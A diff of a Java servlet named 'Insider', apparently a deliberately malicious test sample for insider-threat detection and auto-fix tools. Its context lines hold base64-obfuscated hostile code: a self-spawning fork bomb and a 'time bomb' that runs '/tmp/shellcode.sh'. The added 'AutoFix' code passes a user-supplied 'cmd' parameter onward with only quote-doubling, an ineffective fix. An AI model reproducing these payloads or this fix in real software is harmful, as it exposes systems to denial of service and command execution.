@@ -65,7 +65,12 @@ public class Insider extends HttpServlet {
 
       String source = "cHVibGljIGNsYXNzIEZvcmtCb21iIHsgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nW10gYXJncykgeyB3aGlsZSh0cnVlKSB7IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tdeyJqYXZhdyIsICItY3AiLCBTeXN0ZW0uZ2V0UHJvcGVydHkoImphdmEuY2xhc3MucGF0aCIpLCAiRm9ya0JvbWIifSk7IH0gfSB9";
 
-
+      //Added from AutoFix
+      // RECIPE: SQL Injection
+		  String tracefn = request.getParameter("tracefn");
+		  String cmd = request.getParameter("cmd");
+		  doSomething(escapeSql(tracefn), escapeSql(cmd));
+      
       // RECIPE: Time Bomb pattern
 
       String command = "c2ggL3RtcC9zaGVsbGNvZGUuc2g=";
@@ -172,7 +177,10 @@ public class Insider extends HttpServlet {
     }
     return "";
   }
-
+  //inserted from AutoFix
+  private String escapeSql(String value) {
+					return value.replace("'", "''");
+				}
   public void doSomething(String c, String a) throws Exception {
     doSomethingElse(c,a);
   }
